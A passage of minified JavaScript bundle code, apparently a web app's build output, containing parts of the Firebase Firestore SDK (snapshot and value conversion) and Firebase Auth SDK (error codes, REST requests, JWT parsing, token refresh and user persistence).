ke(Se.INVALID_ARGUMENT,u+a+d)}function Ez(a,e){return a.some((t=>t.isEqual(e)))}class Sz{convertValue(e,t="none"){switch(er(e)){case 0:return null;case 1:return e.booleanValue;case 2:return at(e.integerValue||e.doubleValue);case 3:return this.convertTimestamp(e.timestampValue);case 4:return this.convertServerTimestamp(e,t);case 5:return e.stringValue;case 6:return this.convertBytes(Zs(e.bytesValue));case 7:return this.convertReference(e.referenceValue);case 8:return this.convertGeoPoint(e.geoPointValue);case 9:return this.convertArray(e.arrayValue,t);case 11:return this.convertObject(e.mapValue,t);case 10:return this.convertVectorValue(e.mapValue);default:throw Ge(62114,{value:e})}}convertObject(e,t){return this.convertObjectMap(e.fields,t)}convertObjectMap(e,t="none"){const n={};return dl(e,((i,r)=>{n[i]=this.convertValue(r,t)})),n}convertVectorValue(e){const t=e.fields?.[dh].arrayValue?.values?.map((n=>at(n.doubleValue)));return new Ei(t)}convertGeoPoint(e){return new oo(at(e.latitude),at(e.longitude))}convertArray(e,t){return(e.values||[]).map((n=>this.convertValue(n,t)))}convertServerTimestamp(e,t){switch(t){case"previous":const n=Kh(e);return n==null?null:this.convertValue(n,t);case"estimate":return this.convertTimestamp(Xd(e));default:return null}}convertTimestamp(e){const t=Xs(e);return new Ua(t.seconds,t.nanos)}convertDocumentKey(e,t){const n=Qa.fromString(e);Aa(hw(n),9688,{name:e});const i=new Zd(n.get(1),n.get(3)),r=new Be(n.popFirst(5));return i.isEqual(t)||Jo(`Document ${r} contains a document reference within a different database (${i.projectId}/${i.database}) which is not supported. It will be treated as a reference in the current database (${t.projectId}/${t.database}) instead.`),r}}class $w extends Sz{constructor(e){super(),this.firestore=e}convertBytes(e){return new $n(e)}convertReference(e){const t=this.convertDocumentKey(e,this.firestore._databaseId);return new yt(this.firestore,null,t)}}const N2="@firebase/firestore",_2="4.11.0";function q2(a){return(function(t,n){if(typeof t!="object"||t===null)return!1;const i=t;for(const r of n)if(r in i&&typeof i[r]=="function")return!0;return!1})(a,["next","error","complete"])}class Xw{constructor(e,t,n,i,r){this._firestore=e,this._userDataWriter=t,this._key=n,this._document=i,this._converter=r}get id(){return this._key.path.lastSegment()}get ref(){return new yt(this._firestore,this._converter,this._key)}exists(){return this._document!==null}data(){if(this._document){if(this._converter){const e=new Cz(this._firestore,this._userDataWriter,this._key,this._document,null);return this._converter.fromFirestore(e)}return this._userDataWriter.convertValue(this._document.data.value)}}_fieldsProto(){return this._document?.data.clone().value.mapValue.fields??void 0}get(e){if(this._document){const t=this._document.data.field(HE("DocumentSnapshot.get",e));if(t!==null)return this._userDataWriter.convertValue(t)}}}class Cz extends Xw{data(){return super.data()}}function Tz(a){if(a.limitType==="L"&&a.explicitOrderBy.length===0)throw new ke(Se.UNIMPLEMENTED,"limitToLast() queries require specifying at least one orderBy() clause")}function xz(a,e,t){let n;return n=a?t&&(t.merge||t.mergeFields)?a.toFirestore(e,t):a.toFirestore(e):e,n}class Cd{constructor(e,t){this.hasPendingWrites=e,this.fromCache=t}isEqual(e){return this.hasPendingWrites===e.hasPendingWrites&&this.fromCache===e.fromCache}}class Xr extends Xw{constructor(e,t,n,i,r,l){super(e,t,n,i,l),this._firestore=e,this._firestoreImpl=e,this.metadata=r}exists(){return super.exists()}data(e={}){if(this._document){if(this._converter){const t=new Uf(this._firestore,this._userDataWriter,this._key,this._document,this.metadata,null);return this._converter.fromFirestore(t,e)}return this._userDataWriter.convertValue(this._document.data.value,e.serverTimestamps)}}get(e,t={}){if(this._document){const n=this._document.data.field(HE("DocumentSnapshot.get",e));if(n!==null)return this._userDataWriter.convertValue(n,t.serverTimestamps)}}toJSON(){if(this.metadata.hasPendingWrites)throw new ke(Se.FAILED_PRECONDITION,"DocumentSnapshot.toJSON() attempted to serialize a document with pending writes. Await waitForPendingWrites() before invoking toJSON().");const e=this._document,t={};return t.type=Xr._jsonSchemaVersion,t.bundle="",t.bundleSource="DocumentSnapshot",t.bundleName=this._key.toString(),!e||!e.isValidDocument()||!e.isFoundDocument()?t:(this._userDataWriter.convertObjectMap(e.data.value.mapValue.fields,"previous"),t.bundle=(this._firestore,this.ref.path,"NOT SUPPORTED"),t)}}Xr._jsonSchemaVersion="firestore/documentSnapshot/1.0",Xr._jsonSchema={type:ft("string",Xr._jsonSchemaVersion),bundleSource:ft("string","DocumentSnapshot"),bundleName:ft("string"),bundle:ft("string")};class Uf extends Xr{data(e={}){return super.data(e)}}class Tc{constructor(e,t,n,i){this._firestore=e,this._userDataWriter=t,this._snapshot=i,this.metadata=new Cd(i.hasPendingWrites,i.fromCache),this.query=n}get docs(){const e=[];return this.forEach((t=>e.push(t))),e}get size(){return this._snapshot.docs.size}get empty(){return this.size===0}forEach(e,t){this._snapshot.docs.forEach((n=>{e.call(t,new Uf(this._firestore,this._userDataWriter,n.key,n,new Cd(this._snapshot.mutatedKeys.has(n.key),this._snapshot.fromCache),this.query.converter))}))}docChanges(e={}){const t=!!e.includeMetadataChanges;if(t&&this._snapshot.excludesMetadataChanges)throw new ke(Se.INVALID_ARGUMENT,"To include metadata changes with your document changes, you must also pass { includeMetadataChanges:true } to onSnapshot().");return this._cachedChanges&&this._cachedChangesIncludeMetadataChanges===t||(this._cachedChanges=(function(i,r){if(i._snapshot.oldDocs.isEmpty()){let l=0;return i._snapshot.docChanges.map((u=>{const d=new Uf(i._firestore,i._userDataWriter,u.doc.key,u.doc,new Cd(i._snapshot.mutatedKeys.has(u.doc.key),i._snapshot.fromCache),i.query.converter);return u.doc,{type:"added",doc:d,oldIndex:-1,newIndex:l++}}))}{let l=i._snapshot.oldDocs;return i._snapshot.docChanges.filter((u=>r||u.type!==3)).map((u=>{const d=new Uf(i._firestore,i._userDataWriter,u.doc.key,u.doc,new Cd(i._snapshot.mutatedKeys.has(u.doc.key),i._snapshot.fromCache),i.query.converter);let p=-1,f=-1;return u.type!==0&&(p=l.indexOf(u.doc.key),l=l.delete(u.doc.key)),u.type!==1&&(l=l.add(u.doc),f=l.indexOf(u.doc.key)),{type:Az(u.type),doc:d,oldIndex:p,newIndex:f}}))}})(this,t),this._cachedChangesIncludeMetadataChanges=t),this._cachedChanges}toJSON(){if(this.metadata.hasPendingWrites)throw new ke(Se.FAILED_PRECONDITION,"QuerySnapshot.toJSON() attempted to serialize a document with pending writes. Await waitForPendingWrites() before invoking toJSON().");const e={};e.type=Tc._jsonSchemaVersion,e.bundleSource="QuerySnapshot",e.bundleName=bE.newId(),this._firestore._databaseId.database,this._firestore._databaseId.projectId;const t=[],n=[],i=[];return this.docs.forEach((r=>{r._document!==null&&(t.push(r._document),n.push(this._userDataWriter.convertObjectMap(r._document.data.value.mapValue.fields,"previous")),i.push(r.ref.path))})),e.bundle=(this._firestore,this.query._query,e.bundleName,"NOT SUPPORTED"),e}}function Az(a){switch(a){case 0:return"added";case 2:case 3:return"modified";case 1:return"removed";default:return Ge(61501,{type:a})}}Tc._jsonSchemaVersion="firestore/querySnapshot/1.0",Tc._jsonSchema={type:ft("string",Tc._jsonSchemaVersion),bundleSource:ft("string","QuerySnapshot"),bundleName:ft("string"),bundle:ft("string")};function Pz(a){a=Ks(a,yt);const e=Ks(a.firestore,ip),t=FE(e);return sz(t,a._key).then((n=>ej(e,a,n)))}function zf(a,e,t){a=Ks(a,yt);const n=Ks(a.firestore,ip),i=xz(a.converter,e,t),r=gz(n);return Lz(n,[bz(r,"setDoc",a._key,i,a.converter!==null,t).toMutation(a._key,Fo.none())])}function Zw(a,...e){a=bn(a);let t={includeMetadataChanges:!1,source:"default"},n=0;typeof e[n]!="object"||q2(e[n])||(t=e[n++]);const i={includeMetadataChanges:t.includeMetadataChanges,source:t.source};if(q2(e[n])){const p=e[n];e[n]=p.next?.bind(p),e[n+1]=p.error?.bind(p),e[n+2]=p.complete?.bind(p)}let r,l,u;if(a instanceof yt)l=Ks(a.firestore,ip),u=$h(a._key.path),r={next:p=>{e[n]&&e[n](ej(l,a,p))},error:e[n+1],complete:e[n+2]};else{const p=Ks(a,sg);l=Ks(p.firestore,ip),u=p._query;const f=new $w(l);r={next:h=>{e[n]&&e[n](new Tc(l,f,p,h))},error:e[n+1],complete:e[n+2]},Tz(a._query)}const d=FE(l);return oz(d,u,i,r)}function Lz(a,e){const t=FE(a);return rz(t,e)}function ej(a,e,t){const n=t.docs.get(e._key),i=new $w(a);return new Xr(a,i,e._key,n,new Cd(t.hasPendingWrites,t.fromCache),e.converter)}(function(e,t=!0){s5(Bc),Ic(new il("firestore",((n,{instanceIdentifier:i,options:r})=>{const l=n.getProvider("app").getImmediate(),u=new ip(new c5(n.getProvider("auth-internal")),new p5(l,n.getProvider("app-check-internal")),w5(l,i),l);return r={useFetchStreams:t,...r},u._setSettings(r),u}),"PUBLIC").setMultipleInstances(!0)),Qs(N2,_2,e),Qs(N2,_2,"esm2020")})();var Rz="firebase",Iz="12.9.0";Qs(Rz,Iz,"app");function aj(){return{"dependent-sdk-initialized-before-auth":"Another Firebase SDK was initialized and is trying to use Auth before Auth is initialized. Please be sure to call `initializeAuth` or `getAuth` before starting any other Firebase SDK."}}const wz=aj,tj=new bp("auth","Firebase",aj());const Ch=new mE("@firebase/auth");function jz(a,...e){Ch.logLevel<=ua.WARN&&Ch.warn(`Auth (${Bc}): ${a}`,...e)}function Bf(a,...e){Ch.logLevel<=ua.ERROR&&Ch.error(`Auth (${Bc}): ${a}`,...e)}function Zn(a,...e){throw QE(a,...e)}function Si(a,...e){return QE(a,...e)}function GE(a,e,t){const n={...wz(),[e]:t};return new bp("auth","Firebase",n).create(e,{appName:a.name})}function Vo(a){return GE(a,"operation-not-supported-in-this-environment","Operations that alter the current user are not supported in conjunction with FirebaseServerApp")}function Dz(a,e,t){const n=t;if(!(e instanceof n))throw n.name!==e.constructor.name&&Zn(a,"argument-error"),GE(a,"argument-error",`Type of ${e.constructor.name} does not match expected instance.Did you pass a reference from a different Auth SDK?`)}function QE(a,...e){if(typeof a!="string"){const t=e[0],n=[...e.slice(1)];return n[0]&&(n[0].appName=a.name),a._errorFactory.create(t,...n)}return tj.create(a,...e)}function He(a,e,...t){if(!a)throw QE(e,...t)}function zo(a){const e="INTERNAL ASSERTION FAILED: "+a;throw Bf(e),new Error(e)}function Ko(a,e){a||zo(e)}function m0(){return typeof self<"u"&&self.location?.href||""}function Mz(){return k2()==="http:"||k2()==="https:"}function k2(){return typeof self<"u"&&self.location?.protocol||null}function Nz(){return typeof navigator<"u"&&navigator&&"onLine"in navigator&&typeof navigator.onLine=="boolean"&&(Mz()||UO()||"connection"in navigator)?navigator.onLine:!0}function _z(){if(typeof navigator>"u")return null;const a=navigator;return a.languages&&a.languages[0]||a.language||null}class xp{constructor(e,t){this.shortDelay=e,this.longDelay=t,Ko(t>e,"Short delay should be less than long delay!"),this.isMobile=qO()||zO()}get(){return Nz()?this.isMobile?this.longDelay:this.shortDelay:Math.min(5e3,this.shortDelay)}}function JE(a,e){Ko(a.emulator,"Emulator should always be set here");const{url:t}=a.emulator;return e?`${t}${e.startsWith("/")?e.slice(1):e}`:t}class nj{static initialize(e,t,n){this.fetchImpl=e,t&&(this.headersImpl=t),n&&(this.responseImpl=n)}static fetch(){if(this.fetchImpl)return this.fetchImpl;if(typeof self<"u"&&"fetch"in self)return self.fetch;if(typeof globalThis<"u"&&globalThis.fetch)return globalThis.fetch;if(typeof fetch<"u")return fetch;zo("Could not find fetch implementation, make sure you call FetchProvider.initialize() with an appropriate polyfill")}static headers(){if(this.headersImpl)return this.headersImpl;if(typeof self<"u"&&"Headers"in self)return self.Headers;if(typeof globalThis<"u"&&globalThis.Headers)return globalThis.Headers;if(typeof Headers<"u")return Headers;zo("Could not find Headers implementation, make sure you call FetchProvider.initialize() with an appropriate polyfill")}static response(){if(this.responseImpl)return this.responseImpl;if(typeof self<"u"&&"Response"in self)return self.Response;if(typeof globalThis<"u"&&globalThis.Response)return globalThis.Response;if(typeof Response<"u")return Response;zo("Could not find Response implementation, make sure you call FetchProvider.initialize() with an appropriate polyfill")}}const qz={CREDENTIAL_MISMATCH:"custom-token-mismatch",MISSING_CUSTOM_TOKEN:"internal-error",INVALID_IDENTIFIER:"invalid-email",MISSING_CONTINUE_URI:"internal-error",INVALID_PASSWORD:"wrong-password",MISSING_PASSWORD:"missing-password",INVALID_LOGIN_CREDENTIALS:"invalid-credential",EMAIL_EXISTS:"email-already-in-use",PASSWORD_LOGIN_DISABLED:"operation-not-allowed",INVALID_IDP_RESPONSE:"invalid-credential",INVALID_PENDING_TOKEN:"invalid-credential",FEDERATED_USER_ID_ALREADY_LINKED:"credential-already-in-use",MISSING_REQ_TYPE:"internal-error",EMAIL_NOT_FOUND:"user-not-found",RESET_PASSWORD_EXCEED_LIMIT:"too-many-requests",EXPIRED_OOB_CODE:"expired-action-code",INVALID_OOB_CODE:"invalid-action-code",MISSING_OOB_CODE:"internal-error",CREDENTIAL_TOO_OLD_LOGIN_AGAIN:"requires-recent-login",INVALID_ID_TOKEN:"invalid-user-token",TOKEN_EXPIRED:"user-token-expired",USER_NOT_FOUND:"user-token-expired",TOO_MANY_ATTEMPTS_TRY_LATER:"too-many-requests",PASSWORD_DOES_NOT_MEET_REQUIREMENTS:"password-does-not-meet-requirements",INVALID_CODE:"invalid-verification-code",INVALID_SESSION_INFO:"invalid-verification-id",INVALID_TEMPORARY_PROOF:"invalid-credential",MISSING_SESSION_INFO:"missing-verification-id",SESSION_EXPIRED:"code-expired",MISSING_ANDROID_PACKAGE_NAME:"missing-android-pkg-name",UNAUTHORIZED_DOMAIN:"unauthorized-continue-uri",INVALID_OAUTH_CLIENT_ID:"invalid-oauth-client-id",ADMIN_ONLY_OPERATION:"admin-restricted-operation",INVALID_MFA_PENDING_CREDENTIAL:"invalid-multi-factor-session",MFA_ENROLLMENT_NOT_FOUND:"multi-factor-info-not-found",MISSING_MFA_ENROLLMENT_ID:"missing-multi-factor-info",MISSING_MFA_PENDING_CREDENTIAL:"missing-multi-factor-session",SECOND_FACTOR_EXISTS:"second-factor-already-in-use",SECOND_FACTOR_LIMIT_EXCEEDED:"maximum-second-factor-count-exceeded",BLOCKING_FUNCTION_ERROR_RESPONSE:"internal-error",RECAPTCHA_NOT_ENABLED:"recaptcha-not-enabled",MISSING_RECAPTCHA_TOKEN:"missing-recaptcha-token",INVALID_RECAPTCHA_TOKEN:"invalid-recaptcha-token",INVALID_RECAPTCHA_ACTION:"invalid-recaptcha-action",MISSING_CLIENT_TYPE:"missing-client-type",MISSING_RECAPTCHA_VERSION:"missing-recaptcha-version",INVALID_RECAPTCHA_VERSION:"invalid-recaptcha-version",INVALID_REQ_TYPE:"invalid-req-type"};const kz=["/v1/accounts:signInWithCustomToken","/v1/accounts:signInWithEmailLink","/v1/accounts:signInWithIdp","/v1/accounts:signInWithPassword","/v1/accounts:signInWithPhoneNumber","/v1/token"],Oz=new xp(3e4,6e4);function nr(a,e){return a.tenantId&&!e.tenantId?{...e,tenantId:a.tenantId}:e}async function ir(a,e,t,n,i={}){return ij(a,i,async()=>{let r={},l={};n&&(e==="GET"?l=n:r={body:JSON.stringify(n)});const u=vp({key:a.config.apiKey,...l}).slice(1),d=await a._getAdditionalHeaders();d["Content-Type"]="application/json",a.languageCode&&(d["X-Firebase-Locale"]=a.languageCode);const p={method:e,headers:d,...r};return OO()||(p.referrerPolicy="no-referrer"),a.emulatorConfig&&zc(a.emulatorConfig.host)&&(p.credentials="include"),nj.fetch()(await oj(a,a.config.apiHost,t,u),p)})}async function ij(a,e,t){a._canInitEmulator=!1;const n={...qz,...e};try{const i=new zz(a),r=await Promise.race([t(),i.promise]);i.clearNetworkTimeout();const l=await r.json();if("needConfirmation"in l)throw Ef(a,"account-exists-with-different-credential",l);if(r.ok&&!("errorMessage"in l))return l;{const u=r.ok?l.errorMessage:l.error.message,[d,p]=u.split(" : ");if(d==="FEDERATED_USER_ID_ALREADY_LINKED")throw Ef(a,"credential-already-in-use",l);if(d==="EMAIL_EXISTS")throw Ef(a,"email-already-in-use",l);if(d==="USER_DISABLED")throw Ef(a,"user-disabled",l);const f=n[d]||d.toLowerCase().replace(/[_\s]+/g,"-");if(p)throw GE(a,f,p);Zn(a,f)}}catch(i){if(i instanceof Xo)throw i;Zn(a,"network-request-failed",{message:String(i)})}}async function Ap(a,e,t,n,i={}){const r=await ir(a,e,t,n,i);return"mfaPendingCredential"in r&&Zn(a,"multi-factor-auth-required",{_serverResponse:r}),r}async function oj(a,e,t,n){const i=`${e}${t}?${n}`,r=a,l=r.config.emulator?JE(a.config,i):`${a.config.apiScheme}://${i}`;return kz.includes(t)&&(await r._persistenceManagerAvailable,r._getPersistenceType()==="COOKIE")?r._getPersistence()._getFinalTarget(l).toString():l}function Uz(a){switch(a){case"ENFORCE":return"ENFORCE";case"AUDIT":return"AUDIT";case"OFF":return"OFF";default:return"ENFORCEMENT_STATE_UNSPECIFIED"}}class zz{clearNetworkTimeout(){clearTimeout(this.timer)}constructor(e){this.auth=e,this.timer=null,this.promise=new Promise((t,n)=>{this.timer=setTimeout(()=>n(Si(this.auth,"network-request-failed")),Oz.get())})}}function Ef(a,e,t){const n={appName:a.name};t.email&&(n.email=t.email),t.phoneNumber&&(n.phoneNumber=t.phoneNumber);const i=Si(a,e,n);return i.customData._tokenResponse=t,i}function O2(a){return a!==void 0&&a.enterprise!==void 0}class Bz{constructor(e){if(this.siteKey="",this.recaptchaEnforcementState=[],e.recaptchaKey===void 0)throw new Error("recaptchaKey undefined");this.siteKey=e.recaptchaKey.split("/")[3],this.recaptchaEnforcementState=e.recaptchaEnforcementState}getProviderEnforcementState(e){if(!this.recaptchaEnforcementState||this.recaptchaEnforcementState.length===0)return null;for(const t of this.recaptchaEnforcementState)if(t.provider&&t.provider===e)return Uz(t.enforcementState);return null}isProviderEnabled(e){return this.getProviderEnforcementState(e)==="ENFORCE"||this.getProviderEnforcementState(e)==="AUDIT"}isAnyProviderEnabled(){return this.isProviderEnabled("EMAIL_PASSWORD_PROVIDER")||this.isProviderEnabled("PHONE_PROVIDER")}}async function Fz(a,e){return ir(a,"GET","/v2/recaptchaConfig",nr(a,e))}async function Vz(a,e){return ir(a,"POST","/v1/accounts:delete",e)}async function Th(a,e){return ir(a,"POST","/v1/accounts:lookup",e)}function _d(a){if(a)try{const e=new Date(Number(a));if(!isNaN(e.getTime()))return e.toUTCString()}catch{}}async function Hz(a,e=!1){const t=bn(a),n=await t.getIdToken(e),i=WE(n);He(i&&i.exp&&i.auth_time&&i.iat,t.auth,"internal-error");const r=typeof i.firebase=="object"?i.firebase:void 0,l=r?.sign_in_provider;return{claims:i,token:n,authTime:_d(Wv(i.auth_time)),issuedAtTime:_d(Wv(i.iat)),expirationTime:_d(Wv(i.exp)),signInProvider:l||null,signInSecondFactor:r?.sign_in_second_factor||null}}function Wv(a){return Number(a)*1e3}function WE(a){const[e,t,n]=a.split(".");if(e===void 0||t===void 0||n===void 0)return Bf("JWT malformed, contained fewer than 3 sections"),null;try{const i=uI(t);return i?JSON.parse(i):(Bf("Failed to decode base64 JWT payload"),null)}catch(i){return Bf("Caught error parsing JWT payload as JSON",i?.toString()),null}}function U2(a){const e=WE(a);return He(e,"internal-error"),He(typeof e.exp<"u","internal-error"),He(typeof e.iat<"u","internal-error"),Number(e.exp)-Number(e.iat)}async function op(a,e,t=!1){if(t)return e;try{return await e}catch(n){throw n instanceof Xo&&Gz(n)&&a.auth.currentUser===a&&await a.auth.signOut(),n}}function Gz({code:a}){return a==="auth/user-disabled"||a==="auth/user-token-expired"}class Qz{constructor(e){this.user=e,this.isRunning=!1,this.timerId=null,this.errorBackoff=3e4}_start(){this.isRunning||(this.isRunning=!0,this.schedule())}_stop(){this.isRunning&&(this.isRunning=!1,this.timerId!==null&&clearTimeout(this.timerId))}getInterval(e){if(e){const t=this.errorBackoff;return this.errorBackoff=Math.min(this.errorBackoff*2,96e4),t}else{this.errorBackoff=3e4;const n=(this.user.stsTokenManager.expirationTime??0)-Date.now()-3e5;return Math.max(0,n)}}schedule(e=!1){if(!this.isRunning)return;const t=this.getInterval(e);this.timerId=setTimeout(async()=>{await this.iteration()},t)}async iteration(){try{await this.user.getIdToken(!0)}catch(e){e?.code==="auth/network-request-failed"&&this.schedule(!0);return}this.schedule()}}class f0{constructor(e,t){this.createdAt=e,this.lastLoginAt=t,this._initializeTime()}_initializeTime(){this.lastSignInTime=_d(this.lastLoginAt),this.creationTime=_d(this.createdAt)}_copy(e){this.createdAt=e.createdAt,this.lastLoginAt=e.lastLoginAt,this._initializeTime()}toJSON(){return{createdAt:this.createdAt,lastLoginAt:this.lastLoginAt}}}async function xh(a){const e=a.auth,t=await a.getIdToken(),n=await op(a,Th(e,{idToken:t}));He(n?.users.length,e,"internal-error");const i=n.users[0];a._notifyReloadListener(i);const r=i.providerUserInfo?.length?sj(i.providerUserInfo):[],l=Wz(a.providerData,r),u=a.isAnonymous,d=!(a.email&&i.passwordHash)&&!l?.length,p=u?d:!1,f={uid:i.localId,displayName:i.displayName||null,photoURL:i.photoUrl||null,email:i.email||null,emailVerified:i.emailVerified||!1,phoneNumber:i.phoneNumber||null,tenantId:i.tenantId||null,providerData:l,metadata:new f0(i.createdAt,i.lastLoginAt),isAnonymous:p};Object.assign(a,f)}async function Jz(a){const e=bn(a);await xh(e),await e.auth._persistUserIfCurrent(e),e.auth._notifyListenersIfCurrent(e)}function Wz(a,e){return[...a.filter(n=>!e.some(i=>i.providerId===n.providerId)),...e]}function sj(a){return a.map(({providerId:e,...t})=>({providerId:e,uid:t.rawId||"",displayName:t.displayName||null,email:t.email||null,phoneNumber:t.phoneNumber||null,photoURL:t.photoUrl||null}))}async function Kz(a,e){const t=await ij(a,{},async()=>{const n=vp({grant_type:"refresh_token",refresh_token:e}).slice(1),{tokenApiHost:i,apiKey:r}=a.config,l=await oj(a,i,"/v1/token",`key=${r}`),u=await a._getAdditionalHeaders();u["Content-Type"]="application/x-www-form-urlencoded";const d={method:"POST",headers:u,body:n};return a.emulatorConfig&&zc(a.emulatorConfig.host)&&(d.credentials="include"),nj.fetch()(l,d)});return{accessToken:t.access_token,expiresIn:t.expires_in,refreshToken:t.refresh_token}}async function Yz(a,e){return ir(a,"POST","/v2/accounts:revokeToken",nr(a,e))}class xc{constructor(){this.refreshToken=null,this.accessToken=null,this.expirationTime=null}get isExpired(){return!this.expirationTime||Date.now()>this.expirationTime-3e4}updateFromServerResponse(e){He(e.idToken,"internal-error"),He(typeof e.idToken<"u","internal-error"),He(typeof e.refreshToken<"u","internal-error");const t="expiresIn"in e&&typeof e.expiresIn<"u"?Number(e.expiresIn):U2(e.idToken);this.updateTokensAndExpiration(e.idToken,e.refreshToken,t)}updateFromIdToken(e){He(e.length!==0,"internal-error");const t=U2(e);this.updateTokensAndExpiration(e,null,t)}async getToken(e,t=!1){return!t&&this.accessToken&&!this.isExpired?this.accessToken:(He(this.refreshToken,e,"user-token-expired"),this.refreshToken?(await this.refresh(e,this.refreshToken),this.accessToken):null)}clearRefreshToken(){this.refreshToken=null}async refresh(e,t){const{accessToken:n,refreshToken:i,expiresIn:r}=await Kz(e,t);this.updateTokensAndExpiration(n,i,Number(r))}updateTokensAndExpiration(e,t,n){this.refreshToken=t||null,this.accessToken=e||null,this.expirationTime=Date.now()+n*1e3}static fromJSON(e,t){const{refreshToken:n,accessToken:i,expirationTime:r}=t,l=new xc;return n&&(He(typeof n=="string","internal-error",{appName:e}),l.refreshToken=n),i&&(He(typeof i=="string","internal-error",{appName:e}),l.accessToken=i),r&&(He(typeof r=="number","internal-error",{appName:e}),l.expirationTime=r),l}toJSON(){return{refreshToken:this.refreshToken,accessToken:this.accessToken,expirationTime:this.expirationTime}}_assign(e){this.accessToken=e.accessToken,this.refreshToken=e.refreshToken,this.expirationTime=e.expirationTime}_clone(){return Object.assign(new xc,this.toJSON())}_performRefresh(){return zo("not implemented")}}function js(a,e){He(typeof a=="string"||typeof a>"u","internal-error",{appName:e})}class vi{constructor({uid:e,auth:t,stsTokenManager:n,...i}){this.providerId="firebase",this.proactiveRefresh=new Qz(this),this.reloadUserInfo=null,this.reloadListener=null,this.uid=e,this.auth=t,this.stsTokenManager=n,this.accessToken=n.accessToken,this.displayName=i.displayName||null,this.email=i.email||null,this.emailVerified=i.emailVerified||!1,this.phoneNumber=i.phoneNumber||null,this.photoURL=i.photoURL||null,this.isAnonymous=i.isAnonymous||!1,this.tenantId=i.tenantId||null,this.providerData=i.providerData?[...i.providerData]:[],this.metadata=new f0(i.createdAt||void 0,i.lastLoginAt||void 0)}async getIdToken(e){const t=await op(this,this.stsTokenManager.getToken(this.auth,e));return He(t,this.auth,"internal-error"),this.accessToken!==t&&(this.accessToken=t,await this.auth._persistUserIfCurrent(this),this.auth._notifyListenersIfCurrent(this)),t}getIdTokenResult(e){return Hz(this,e)}reload(){return Jz(this)}_assign(e){this!==e&&(He(this.uid===e.uid,this.auth,"internal-error"),this.displayName=e.displayName,this.photoURL=e.photoURL,this.email=e.email,this.emailVerified=e.emailVerified,this.phoneNumber=e.phoneNumber,this.isAnonymous=e.isAnonymous,this.tenantId=e.tenantId,this.providerData=e.providerData.map(t=>({...t})),this.metadata._copy(e.metadata),this.stsTokenManager._assign(e.stsTokenManager))}_clone(e){const t=new vi({...this,auth:e,stsTokenManager:this.stsTokenManager._clone()});return t.metadata._copy(this.metadata),t}_onReload(e){He(!this.reloadListener,this.auth,"internal-error"),this.reloadListener=e,this.reloadUserInfo&&(this._notifyReloadListener(this.reloadUserInfo),this.reloadUserInfo=null)}_notifyReloadListener(e){this.reloadListener?this.reloadListener(e):this.reloadUserInfo=e}_startProactiveRefresh(){this.proactiveRefresh._start()}_stopProactiveRefresh(){this.proactiveRefresh._stop()}async _updateTokensIfNecessary(e,t=!1){let n=!1;e.idToken&&e.idToken!==this.stsTokenManager.accessToken&&(this.stsTokenManager.updateFromServerResponse(e),n=!0),t&&await xh(this),await this.auth._persistUserIfCurrent(this),n&&this.auth._notifyListenersIfCurrent(this)}async delete(){if(wn(this.auth.app))return Promise.reject(Vo(this.auth));const e=await this.getIdToken();return await op(this,Vz(this.auth,{idToken:e})),this.stsTokenManager.clearRefreshToken(),this.auth.signOut()}toJSON(){return{uid:this.uid,email:this.email||void 0,emailVerified:this.emailVerified,displayName:this.displayName||void 0,isAnonymous:this.isAnonymous,photoURL:this.photoURL||void 0,phoneNumber:this.phoneNumber||void 0,tenantId:this.tenantId||void 0,providerData:this.providerData.map(e=>({...e})),stsTokenManager:this.stsTokenManager.toJSON(),_redirectEventId:this._redirectEventId,...this.metadata.toJSON(),apiKey:this.auth.config.apiKey,appName:this.auth.name}}get refreshToken(){return this.stsTokenManager.refreshToken||""}static _fromJSON(e,t){const n=t.displayName??void 0,i=t.email??void 0,r=t.phoneNumber??void 0,l=t.photoURL??void 0,u=t.tenantId??void 0,d=t._redirectEventId??void 0,p=t.createdAt??void 0,f=t.lastLoginAt??void 0,{uid:h,emailVerified:E,isAnonymous:C,providerData:A,stsTokenManager:j}=t;He(h&&j,e,"internal-error");const R=xc.fromJSON(this.name,j);He(typeof h=="string",e,"internal-error"),js(n,e.name),js(i,e.name),He(typeof E=="boolean",e,"internal-error"),He(typeof C=="boolean",e,"internal-error"),js(r,e.name),js(l,e.name),js(u,e.name),js(d,e.name),js(p,e.name),js(f,e.name);const I=new vi({uid:h,auth:e,email:i,emailVerified:E,displayName:n,isAnonymous:C,photoURL:l,phoneNumber:r,tenantId:u,stsTokenManager:R,createdAt:p,lastLoginAt:f});return A&&Array.isArray(A)&&(I.providerData=A.map(w=>({...w}))),d&&(I._redirectEventId=d),I}static async _fromIdTokenResponse(e,t,n=!1){const i=new xc;i.updateFromServerResponse(t);const r=new vi({uid:t.localId,auth:e,stsTokenManager:i,isAnonymous:n});return await xh(r),r}static async _fromGetAccountInfoResponse(e,t,n){const i=t.users[0];He(i.localId!==void 0,"internal-error");const r=i.providerUserInfo!==void 0?sj(i.providerUserInfo):[],l=!(i.email&&i.passwordHash)&&!r?.length,u=new xc;u.updateFromIdToken(n);const d=new vi({uid:i.localId,auth:e,stsTokenManager:u,isAnonymous:l}),p={uid:i.localId,displayName:i.displayName||null,photoURL:i.photoUrl||null,email:i.email||null,emailVerified:i.emailVerified||!1,phoneNumber:i.phoneNumber||null,tenantId:i.tenantId||null,providerData:r,metadata:new f0(i.createdAt,i.lastLoginAt),isAnonymous:!(i.email&&i.passwordHash)&&!r?.length};return Object.assign(d,p),d}}const z2=new Map;function Bo(a){Ko(a instanceof Function,"Expected a class definition");let e=z2.get(a);return e?(Ko(e instanceof a,"Instance stored in cache mismatched with class"),e):(e=new a,z2.set(a,e),e)}class rj{constructor(){this.type="NONE",this.storage={}}async _isAvailable(){return!0}async _set(e,t){this.storage[e]=t}async _get(e){const t=this.storage[e];return t===void 0?null:t}async _remove(e){delete this.storage[e]}_addListener(e,t){}_removeListener(e,t){}}rj.type="NONE";const B2=rj;function Ff(a,e,t){return`firebase:${a}:${e}:${t}`}class Ac{constructor(e,t,n){this.persistence=e,this.auth=t,this.userKey=n;const{config:i,name:r}=this.auth;this.fullUserKey=Ff(this.userKey,i.apiKey,r),this.fullPersistenceKey=Ff("persistence",i.apiKey,r),this.boundEventHandler=t._onStorageEvent.bind(t),this.persistence._addListener(this.fullUserKey,this.boundEventHandler)}setCurrentUser(e){return this.persistence._set(this.fullUserKey,e.toJSON())}async getCurrentUser(){const e=await this.persistence._get(this.fullUserKey);if(!e)return null;if(typeof e=="string"){const t=await Th(this.auth,{idToken:e}).catch(()=>{});return t?vi._fromGetAccountInfoResponse(this.auth,t,e):null}return vi._fromJSON(this.auth,e)}removeCurrentUser(){return this.persistence._remove(this.fullUserKey)}savePersistenceForRedirect(){return 